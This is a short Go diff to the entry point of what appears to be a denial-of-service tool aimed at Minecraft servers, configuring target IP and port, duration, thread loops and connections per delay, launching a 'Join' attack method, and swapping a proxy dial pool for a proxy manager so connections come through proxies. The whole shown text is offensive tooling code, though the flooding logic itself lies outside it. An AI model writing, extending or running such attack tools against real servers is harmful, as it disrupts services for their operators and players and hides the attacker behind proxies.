@@ -15,7 +15,7 @@ var (
 	port     = flag.Int("port", 25565, "sets port")
 	protocol = flag.Int("protcol", 761, "sets version protocol")
 	duration = flag.Int("duration", 600, "duration in sec")
-	loops    = flag.Int("loops", 1, "for loop threads")
+	loops    = flag.Int("loops", 1, "no of loop threads")
 	delay    = flag.Int("delay", 1, "delay in sec")
 	perDelay = flag.Int("perdelay", 1000, "connections per delay")
 )
@@ -30,13 +30,9 @@ func main() {
 		log.Fatal(err)
 	}
 
-	dialPool := proxy.DialPool{}
-	dialPool.AddFromProxyManager(&proxyManager)
-
 	method := methods.Join{}
 
 	method.Start(
-
 		&core.AttackInfo{
 			Ip:       *ip,
 			Port:     *port,
@@ -46,8 +42,7 @@ func main() {
 			Delay:    time.Duration(*delay) * time.Second,
 			PerDelay: *perDelay,
 		},
-
-		&dialPool,
+		&proxyManager,
 	)
 }
 
